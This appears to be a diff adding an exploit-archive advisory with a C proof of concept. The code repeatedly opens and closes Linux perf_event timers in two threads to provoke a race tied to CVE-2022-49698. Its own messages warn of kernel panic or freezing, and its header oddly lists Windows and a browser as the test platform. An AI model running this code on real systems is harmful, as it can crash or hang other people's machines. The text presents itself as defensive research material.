@@ -1,0 +1,66 @@
+=============================================================================================================================================
+| # Title     : Linux Kernel perf_event – Race Condition Trigger Simulation hrtimer Interaction Test                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://ubuntu.com                                                                                                          |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214655/ & 	CVE-2022-49698
+
+[+] Summary    : a race-condition stress test targeting the Linux kernel perf_event subsystem, specifically the interaction between high-resolution timers (hrtimer) and rapid event lifecycle operations.
+                 The code repeatedly opens and closes software-based performance events in a multithreaded context to simulate a timing window where 
+				 an event may be released while its associated timer is still active. Such conditions have historically been associated with stability issues (e.g., use-after-free or kernel panic) in certain kernel versions.
+                 This PoC does not exploit a confirmed vulnerability, does not bypass kernel protections, and does not demonstrate privilege escalation. 
+				 It is provided solely for educational, defensive research, and kernel behavior analysis, helping researchers evaluate system robustness under extreme race-condition scenarios.
+
+[+] POC : 
+
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/perf_event.h>
+#include <pthread.h>
+#include <signal.h>
+
+int fd;
+void* race_thread(void* arg) {
+    struct perf_event_attr attr = {0};
+    attr.type = PERF_TYPE_SOFTWARE;
+    attr.config = PERF_COUNT_SW_CPU_CLOCK; 
+    attr.size = sizeof(struct perf_event_attr);
+    attr.sample_period = 1; 
+    attr.disabled = 0;
+
+    while (1) {
+
+        fd = syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
+        if (fd != -1) {
+
+            close(fd);
+        }
+    }
+    return NULL;
+}
+
+int main() {
+    pthread_t thread1, thread2;
+
+    printf("[+] Start trying to create a time-based race (Race Condition)...\n");
+    printf("[!] If the system is infected, Kernel Panic or freezing may occur..\n");
+
+    pthread_create(&thread1, NULL, race_thread, NULL);
+    pthread_create(&thread2, NULL, race_thread, NULL);
+
+    while(1) {
+        sleep(1);
+    }
+
+    return 0;
+}
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
